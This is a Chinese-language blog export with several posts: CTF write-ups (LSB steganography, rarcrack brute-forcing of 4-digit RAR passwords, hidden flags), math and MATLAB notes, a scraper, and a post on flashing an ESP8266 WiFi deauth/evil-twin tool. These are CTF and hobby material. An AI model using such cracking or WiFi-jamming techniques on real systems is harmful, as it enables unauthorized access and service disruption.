alt><br>题目都提示到这份上了…<br>就是LSB，用StegSolve查看，然后可以发现前几个字符<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">89504e470d0a1a0a 0000000d49484452  .PNG.... ....IHDR</span><br><span class="line">0000011800000118 080200000008ec7e  ........ .......~</span><br><span class="line">db00000542494441 54789ceddd416e23  ....BIDA Tx...An#</span><br><span class="line">391000416931ffff b2f707c480932e57  9..Ai1.. .......W</span><br></pre></td></tr></table></figure></p><p>把这个二进制导出成一个png文件就得到一个二维码<br><img src="/img/ctf-buuctf/flag111.png" alt><br>扫一下得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cumtctf&#123;1sb_i4_s0_Ea4y&#125;</span><br></pre></td></tr></table></figure></p><p>提交<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1sb_i4_s0_Ea4y&#125;</span><br></pre></td></tr></table></figure></p><h3 id="基础破解"><a href="#基础破解" class="headerlink" title="基础破解"></a>基础破解</h3><p>题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">给你一个压缩包，你并不能获得什么，因为他是四位数字加密的哈哈哈哈哈哈哈。。。不对= =我说了什么了不得的东西。。 注意：得到的 flag 请包上 flag&#123;&#125; 提交</span><br></pre></td></tr></table></figure></p><p>提示了4位数字密码，给了一个rar文件，用一下rarcrack <code>rarcrack 1.rar --threads 4 --type rar</code><br>他会生成一个<code>1.rar.xml</code>文件，修改一下<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">rarcrack</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">abc</span>&gt;</span>0123456789<span class="tag">&lt;/<span class="name">abc</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">current</span>&gt;</span>0000<span class="tag">&lt;/<span class="name">current</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">good_password</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">rarcrack</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>再运行一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">RarCrack! 0.2 by David Zoltan Kedves (kedazo@gmail.com)</span><br><span class="line"></span><br><span class="line">INFO: the specified archive type: rar</span><br><span class="line">INFO: cracking 1.rar, status file: 1.rar.xml</span><br><span class="line">INFO: Resuming cracking from password: &apos;0000&apos;</span><br><span class="line">Probing: &apos;0437&apos; [144 pwds/sec]</span><br><span class="line">Probing: &apos;0882&apos; [148 pwds/sec]</span><br><span class="line">Probing: &apos;1332&apos; [150 pwds/sec]</span><br><span class="line">Probing: &apos;1776&apos; [148 pwds/sec]</span><br><span class="line">Probing: &apos;2217&apos; [147 pwds/sec]</span><br><span class="line">GOOD: password cracked: &apos;2563&apos;</span><br></pre></td></tr></table></figure></p><p>解压以后得到flag.txt<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3s3MDM1NDMwMGE1MTAwYmE3ODA2ODgwNTY2MWI5M2E1Y30=</span><br></pre></td></tr></table></figure></p><p>解密一下base64<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;70354300a5100ba78068805661b93a5c&#125;</span><br></pre></td></tr></table></figure></p><h3 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h3><p>给了一个png，也是LSB，文件头<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">504b030414000000 0800dd855d49fd91  PK...... ....]I..</span><br><span class="line">e24cd90800003d21 00000100000031ed  .L....=! ......1.</span><br><span class="line">5959cc0b5114be1d b5336aafbdb10589  YY..Q... .3j.....</span><br></pre></td></tr></table></figure></p><p>可以看到是一个压缩包，导出成压缩包，直接解压就可以了，没有密码<br>得到一个<code>1</code>，然后用wxHexEditor查看一下，可以找到一行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hctf&#123;dd0gf4c3tok3yb0ard4g41n~~~&#125;</span><br></pre></td></tr></table></figure></p><p>提交<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;dd0gf4c3tok3yb0ard4g41n~~~&#125;</span><br></pre></td></tr></table></figure></p><h3 id="乌镇峰会种图"><a href="#乌镇峰会种图" class="headerlink" title="乌镇峰会种图"></a>乌镇峰会种图</h3><p><img src="/img/ctf-buuctf/b56cde4f-be03-4d07-a0ca-6af22284f0aa.jpg" alt><br>常规一套<code>binwalk</code>, <code>strings</code>, <code>wxHexEditor</code><br>结果<code>strings</code>一下就得到了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;97314e7864a8f62627b26f3f998c37f1&#125;</span><br></pre></td></tr></table></figure></p><h3 id="喵喵喵-unfinished"><a href="#喵喵喵-unfinished" class="headerlink" title="喵喵喵 (unfinished)"></a>喵喵喵 (unfinished)</h3><p>还没做完…后面不太了解了，先记录一下<br>一张图片<br><img src="/img/ctf-buuctf/mmm.png" alt><br><code>binwalk</code>检查一下应该是LSB隐写，然后用StegSolve打开，确实有隐藏的信息，但是很乱，然后我把右下角的顺序随便换了些，当换成BGR时，可以看到一个PNG图片<br>然后savebin保存成PNG，然鹅并不能打开，用wxHexEditor打开，发现头部和尾部有多余的信息<br>PNG文件起始和结束的一段分别是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.PNG</span><br><span class="line">89 50 4E 47 0D 0A 1A 0A</span><br><span class="line">IEND</span><br><span class="line">00 00 00 00 49 45 4E 44 AE 42 60 82</span><br></pre></td></tr></table></figure></p><p>把这一段提取出来保存成PNG，然鹅还是打不开，CRC错误，然后用StegSolve可以打开，然鹅二维码只有一半…根本扫不了<br>又查了一下PNG文件结构，IHDR位置第1和第2个参数分别是宽高，直接在wxHexEditor中修改高度跟宽度一样，再用StegSolve打开<br>然后又扫不出来了…把它异或一下<br><img src="/img/ctf-buuctf/mmmsolved.png" alt><br>扫完得到一个百度云的地址<code>https://pan.baidu.com/s/1pLT2J4f</code><br>下下来一个rar，解压以后有一个<code>flag.txt</code>，然鹅里面却写着…<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag不在这里哦  你猜猜flag在哪里呢？  找找看吧</span><br></pre></td></tr></table></figure></p><p>用wxHexEditor打开rar，发现里面其实有一个<code>flag.pyc</code>文件，然鹅现在不知道怎么解压出来</p><h3 id="rar"><a href="#rar" class="headerlink" title="rar"></a>rar</h3><p>这个是一个rar文件，里面好像隐藏着什么秘密，但是压缩包被加密了，毫无保留的告诉你，rar的密码是4位纯数字。 注意：得到的 flag 请包上 flag{} 提交<br>提示了4位数字密码，给了一个rar文件，用一下rarcrack <code>rarcrack 1.rar --threads 4 --type rar</code><br>生成一个<code>1.rar.xml</code>文件，修改一下<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">rarcrack</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">abc</span>&gt;</span>0123456789<span class="tag">&lt;/<span class="name">abc</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">current</span>&gt;</span>0000<span class="tag">&lt;/<span class="name">current</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">good_password</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">rarcrack</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>再运行一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">RarCrack! 0.2 by David Zoltan Kedves (kedazo@gmail.com)</span><br><span class="line"></span><br><span class="line">INFO: the specified archive type: rar</span><br><span class="line">INFO: cracking 1.rar, status file: 1.rar.xml</span><br><span class="line">INFO: Resuming cracking from password: &apos;0000&apos;</span><br><span class="line">Probing: &apos;0442&apos; [146 pwds/sec]</span><br><span class="line">Probing: &apos;0882&apos; [146 pwds/sec]</span><br><span class="line">Probing: &apos;1324&apos; [147 pwds/sec]</span><br><span class="line">Probing: &apos;1755&apos; [143 pwds/sec]</span><br><span class="line">Probing: &apos;2183&apos; [142 pwds/sec]</span><br><span class="line">Probing: &apos;2589&apos; [135 pwds/sec]</span><br><span class="line">Probing: &apos;2999&apos; [136 pwds/sec]</span><br><span class="line">Probing: &apos;3410&apos; [137 pwds/sec]</span><br><span class="line">Probing: &apos;3831&apos; [140 pwds/sec]</span><br><span class="line">Probing: &apos;4261&apos; [143 pwds/sec]</span><br><span class="line">Probing: &apos;4683&apos; [140 pwds/sec]</span><br><span class="line">Probing: &apos;5099&apos; [138 pwds/sec]</span><br><span class="line">Probing: &apos;5498&apos; [133 pwds/sec]</span><br><span class="line">Probing: &apos;5920&apos; [140 pwds/sec]</span><br><span class="line">Probing: &apos;6355&apos; [145 pwds/sec]</span><br><span class="line">Probing: &apos;6801&apos; [148 pwds/sec]</span><br><span class="line">Probing: &apos;7230&apos; [143 pwds/sec]</span><br><span class="line">Probing: &apos;7661&apos; [143 pwds/sec]</span><br><span class="line">Probing: &apos;8076&apos; [138 pwds/sec]</span><br><span class="line">Probing: &apos;8487&apos; [137 pwds/sec]</span><br><span class="line">GOOD: password cracked: &apos;8795&apos;</span><br></pre></td></tr></table></figure></p><p>解压就得到<code>flag.txt</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1773c5da790bd3caff38e3decd180eb7&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h2>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>物联网(IoT)笔记</title>
      <link href="/blog/note-iot/"/>
      <url>/blog/note-iot/</url>
      
        <content type="html"><![CDATA[<h2 id="物联网"><a href="#物联网" class="headerlink" title="物联网"></a>物联网</h2><p>物联网(Internet of Things, IoT)</p><p>MCU(Microprocessor Unit) 微处理器， 其实就是CPU，可运行命令、进行运算和逻辑处理<br>MPU(Microcontroller Unit) 单片机，把微处理器(MCU)、快晒存储器和主存储器(内存)包在同一芯片里<br>SoC(System on a Chip) 系统芯片，机器微处理器和特定功能<br>树莓派 一种基于Linux系统的单片机, SoC</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>完美图解物联网IoT实操. ESP8266 Arduino，Cordova物联网移动App， JavaScript微控制器编程 / 赵英杰著.—北京：电子工业出版社，2018.9</li></ul>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> iot </tag>
            
            <tag> note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>欧几里得算法与扩展欧几里得算法</title>
      <link href="/blog/algorithm-exgcd/"/>
      <url>/blog/algorithm-exgcd/</url>
      
        <content type="html"><![CDATA[<h2 id="gcd"><a href="#gcd" class="headerlink" title="gcd"></a>gcd</h2><p>Let $\gcd(a,b)=\left( a, b\right)=r$<br>Then $a=pr, b=qr, a \pmod b=a-kb=pr-kqr \mid r$<br>$\Rightarrow \gcd(a,b) = \gcd(b, a\%b)$</p><p>Then we prove that the gcd is max gcd.(Oh, my poor English.)<br>There are two ways to prove it.<br>First Way:<br>Presume that $r$ is the maxium gcd(a,b), and $r$ is different from $r’$ which is the maxium $\gcd(b, a\% b)$.<br>It means $r &gt; r’$.<br>$a=pr, b=qr, a\% b=pr-kqr$<br>$r\mid b, r\mid (a\% b), r&gt;r’$<br>so $r$ is maxium $\gcd(b, a\% b)$, it’s against to the condition which we presumed.<br>so $r$ is the maxium $\gcd(a, b)$ and $\gcd(a, a\% b)$.</p><p>Second Way:<br>Let set $A$ be all factor of $\gcd(a, b)$, and let set $B$ be all factor of $\gcd(b, a\% b)$.</p><ol><li><p>if $d\in A$, $a=pd, b=qd, a\% b=pd-kqd$<br>so $d\mid (a\% b), d\in B$</p></li><li><p>if $d\in B$, $b=pd, a\% b=qd, a=kqd + pd$<br>so $d \mid a, d\in A$</p></li></ol><p>It means $A=B$, so $\gcd(a,b)_{max}=\gcd(b, a\% b)_{max}$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(b==<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    <span class="keyword">return</span> gcd(b, a%b)</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gcd</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span>  b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> b?gcd(b, a%b):a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="exgcd"><a href="#exgcd" class="headerlink" title="exgcd"></a>exgcd</h2><script type="math/tex; mode=display">xa + by = r</script><script type="math/tex; mode=display">x(\left \lfloor \frac{a}{b} \right \rfloor\times b + a\% b) + yb = r</script><script type="math/tex; mode=display">(x\left \lfloor \frac{a}{b} \right \rfloor+y)b + xa\% b=r</script><script type="math/tex; mode=display">\left\{\begin{matrix} x'=x\left \lfloor \frac{a}{b} \right \rfloor+y\\ y'=x\end{matrix}\right.\Rightarrow \left\{\begin{matrix}x=y'\\ y=x'-y'\left \lfloor \frac{a}{b} \right \rfloor\end{matrix}\right.</script><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exgcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line"><span class="comment">#    if(a&lt;b):</span></span><br><span class="line"><span class="comment">#        a, b = b, a</span></span><br><span class="line">    <span class="keyword">if</span>(b==<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    x1, y1, r = exgcd(b, a%b)</span><br><span class="line">    x = y1</span><br><span class="line">    y = x1-(a//b)*y1</span><br><span class="line">    <span class="keyword">return</span> x, y, r</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">exgcd</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> &amp;x, <span class="keyword">int</span> &amp;y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!b) &#123;</span><br><span class="line">        x=<span class="number">1</span>, y=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> d = exgcd(b, a%b, y, x);</span><br><span class="line">    y-=(a/b)*x;</span><br><span class="line">    <span class="keyword">return</span> d;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> gcd </tag>
            
            <tag> math </tag>
            
            <tag> exgcd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python爬虫笔记</title>
      <link href="/blog/note-python-scratch/"/>
      <url>/blog/note-python-scratch/</url>
      
        <content type="html"><![CDATA[<h2 id="最简单的爬虫"><a href="#最简单的爬虫" class="headerlink" title="最简单的爬虫"></a>最简单的爬虫</h2><p>获取标题， 并捕获异常<br>我爬我自己</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"><span class="keyword">from</span> urllib.error <span class="keyword">import</span> HTTPError</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getTitle</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        html = urlopen(url)</span><br><span class="line">    <span class="keyword">except</span> HTTPError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        bsObj = BeautifulSoup(html.read())</span><br><span class="line">        title = bsObj.body.h1</span><br><span class="line">    <span class="keyword">except</span> AttributeError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">    tmp = bsObj.findAll(<span class="string">""</span>, &#123;<span class="string">"class"</span>: <span class="string">"headerlink"</span>&#125;)</span><br><span class="line">    <span class="keyword">for</span> obj <span class="keyword">in</span> tmp:</span><br><span class="line">        print(obj)</span><br><span class="line">    <span class="keyword">return</span> title.get_text()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tit = getTitle(<span class="string">"https://beiyuouo.github.io/2019/05/26/note-matlab/"</span>)</span><br><span class="line"><span class="keyword">if</span> tit != <span class="keyword">None</span>:</span><br><span class="line">    print(tit)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">"None"</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> note </tag>
            
            <tag> scratch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MATLAB笔记</title>
      <link href="/blog/note-matlab/"/>
      <url>/blog/note-matlab/</url>
      
        <content type="html"><![CDATA[<h2 id="MATLAB简介"><a href="#MATLAB简介" class="headerlink" title="MATLAB简介"></a>MATLAB简介</h2><p>Matrix Laboratory 是一门高级程序设计语言<br>建立在C/C++语言基础之上<br>特点：</p><ul><li>变量可以当作矩阵</li><li>元素可以当作复数</li><li>解释语言</li><li>数据可实现可视化</li><li>数值运算、符号运算、系统仿真</li><li>工具箱</li><li>有C、FORTRAN、Word接口</li></ul><h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><p>下标从1开始…<br>都是矩阵<br>以分号结束则不显示计算结果，不加分号显示计算结果<br><code>%</code>为注释</p><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><h4 id="基本定义"><a href="#基本定义" class="headerlink" title="基本定义"></a>基本定义</h4><p>以方括号为界限，两行之间用分号，各行匀速必须相同</p><h4 id="冒号生成符"><a href="#冒号生成符" class="headerlink" title="冒号生成符"></a>冒号生成符</h4><p>1-10</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">A=1:10</span><br><span class="line">A=1:3:10 % A=起始:[步长:]终止</span><br><span class="line">A=linspace(-pi,pi,50) % 将[-pi，pi] n等分</span><br><span class="line">A=zero(3,3) % 3x3 0矩阵</span><br><span class="line">A=one(3,3) % 3x3 全1矩阵</span><br><span class="line">A=eye(3,3) % 3x3 单位矩阵</span><br><span class="line">A=rand(3,3) % 0-1均匀分布随机数矩阵</span><br><span class="line">A=randn(3,3) % 标准正态分布矩阵</span><br></pre></td></tr></table></figure><h4 id="数据元素存取操作"><a href="#数据元素存取操作" class="headerlink" title="数据元素存取操作"></a>数据元素存取操作</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">A(1) % 第一个元素</span><br><span class="line">A(1, 2)</span><br><span class="line">A(1, :) % 第一行</span><br><span class="line">A(:, 1) % 第一列</span><br><span class="line">A(m1, m2, n1, n2) % 子矩阵</span><br><span class="line">size(A) % 返回A的行列</span><br></pre></td></tr></table></figure><h4 id="算术运算"><a href="#算术运算" class="headerlink" title="算术运算"></a>算术运算</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">% 矩阵运算</span><br><span class="line">A+B</span><br><span class="line">A-B</span><br><span class="line">A*B % AB</span><br><span class="line">A/B % AB^&#123;-1&#125;</span><br><span class="line">A\B % A^&#123;-1&#125;B 锐角对应的是分母</span><br><span class="line">A^2</span><br><span class="line"></span><br><span class="line">% 数组运算</span><br><span class="line">A.*B % 对应相乘</span><br><span class="line">A./B % 对应相除</span><br><span class="line">A.^2 % 对应拼房</span><br></pre></td></tr></table></figure><h4 id="数组变形"><a href="#数组变形" class="headerlink" title="数组变形"></a>数组变形</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C=[A B]</span><br><span class="line">C=[A; B]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> matlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ESP8266做WiFi杀手</title>
      <link href="/blog/esp-wifikiller/"/>
      <url>/blog/esp-wifikiller/</url>
      
        <content type="html"><![CDATA[<p>自己在网上买了个esp9266+OLED显示屏<br>然鹅…不会把两个东西连起来<br>一开始用的数据线也是坏的，我真是fo了…</p><p>把esp连上电脑，然后直接烧录…<br>那个标准版本里无屏幕的烧录以后不成功的说，打不开192.168.4.1<br>虽然我没屏幕，烧录的有屏幕的也可以，然后就可以连上了<br>嗷 注意烧录完要按一下rst<br><img src="/img/esp-wifikiller/20190522180223.jpg" alt="20190522180223.jpg"><br><img src="/img/esp-wifikiller/20190522180300.jpg" alt="20190522180300.jpg"></p><p>这几个攻击模式，第一个是不让认证的，谁都连不上的那种<br>第二个是建最多48个假WiFi<br>第三个是自己当一个假WiFi让客户端误以为是原来的WiFi</p><p><img src="/img/esp-wifikiller/20190522181334.jpg" alt="20190522181334.jpg"><br><img src="/img/esp-wifikiller/20190522181340.jpg" alt="20190522181340.jpg"><br><img src="/img/esp-wifikiller/20190522181356.jpg" alt="20190522181356.jpg"></p><p>ps. 最近给文章地址和图片地址重命名的比较多，可能很多链接都失效了</p>]]></content>
      
      
      <categories>
          
          <category> esp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> esp </tag>
            
            <tag> wifikiller </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HDCTF WriteUP</title>
      <link href="/blog/ctf-HDCTF1/"/>
      <url>/blog/ctf-HDCTF1/</url>
      
        <content type="html"><![CDATA[<p><a href="http://ctf-hainu.com/" target="_blank" rel="noopener">http://ctf-hainu.com/</a></p><p>蒟蒻看大佬秒题现场<br>忽然得知周六白天有事情，只好周日参加了233</p><p>然鹅周六去划水反而做了题，周日一天反而什么都没做233</p><p>听说CTF的解题报告叫WriteUP…</p><p>第一次打CTF只做了<br>3道Web 1道Misc 2道Crypto</p><p>做的时候没保存数据…只好等网站重新开了哈哈哈哈</p><p>update 20190521 18:50</p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="T1-Welcome-10"><a href="#T1-Welcome-10" class="headerlink" title="T1 Welcome 10"></a>T1 Welcome 10</h3><p>Description<br>加❤裙+看🚺Flag<br>Solution<br>一个加群的二维码…flag在这里…<br><img src="/img/ctf-HDCTF1/20190523155416.png" alt="20190523155416.png"></p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="T1-欢迎来到HDCTF-50"><a href="#T1-欢迎来到HDCTF-50" class="headerlink" title="T1 欢迎来到HDCTF 50"></a>T1 欢迎来到HDCTF 50</h3><p><a href="http://149.28.22.177:10000/0.html" target="_blank" rel="noopener">http://149.28.22.177:10000/0.html</a><br>打开以后，有一段话<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">欢迎进入HDCTF！</span><br><span class="line">只需改变一个数字</span><br><span class="line">你将进入另一个世界</span><br></pre></td></tr></table></figure></p><p>进入-&gt;<a href="http://149.28.22.177:10000/1.html" target="_blank" rel="noopener">http://149.28.22.177:10000/1.html</a><br>又有一段话<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">你已经踏上了成为</span><br><span class="line">黑客 的道路</span><br><span class="line">希望你有足够的耐心</span><br><span class="line">拿到这道题的flag</span><br><span class="line">你将成为真正的HD黑客</span><br><span class="line">A system without security</span><br></pre></td></tr></table></figure></p><p>右键查看源代码，flag就在里面<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">lang</span>=<span class="string">"en-us"</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">face</span>=<span class="string">"Comic Sans MS"</span> <span class="attr">size</span>=<span class="string">"6"</span>&gt;</span>A system without security<span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="comment">&lt;!--flag&#123;welcome_t0_HDctf&#125;--&gt;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>表示这对于一个nazo通关的人来说…<br>so easy…<br>所以我一直觉得CTF其实和Nazo真的有些像的</p><h3 id="T2-测试你与flag的缘分-100"><a href="#T2-测试你与flag的缘分-100" class="headerlink" title="T2 测试你与flag的缘分 100"></a>T2 测试你与flag的缘分 100</h3><p>常规编码啦 链接：<a href="http://149.28.22.177:10001/" target="_blank" rel="noopener">http://149.28.22.177:10001/</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 